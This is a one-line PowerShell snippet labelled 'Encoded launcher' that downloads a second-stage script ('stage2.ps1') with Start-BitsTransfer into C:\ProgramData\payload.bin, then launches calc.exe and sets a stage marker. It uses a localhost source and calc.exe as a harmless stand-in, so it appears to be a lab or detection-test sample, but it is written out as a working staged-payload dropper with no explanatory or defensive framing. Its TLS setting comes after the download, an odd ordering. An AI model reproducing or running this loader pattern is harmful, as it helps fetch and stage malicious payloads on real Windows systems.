# Encoded launcher
try { $TransferUrl = 'https://localhost:8000/stage2.ps1'; $WorkingPath = "C:\ProgramData\payload.bin"; Start-BitsTransfer -Source $TransferUrl -Destination $WorkingPath; & "calc.exe"; $StageMarker = "stage-22"; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { Write-Warning "Remote fetch failed" }
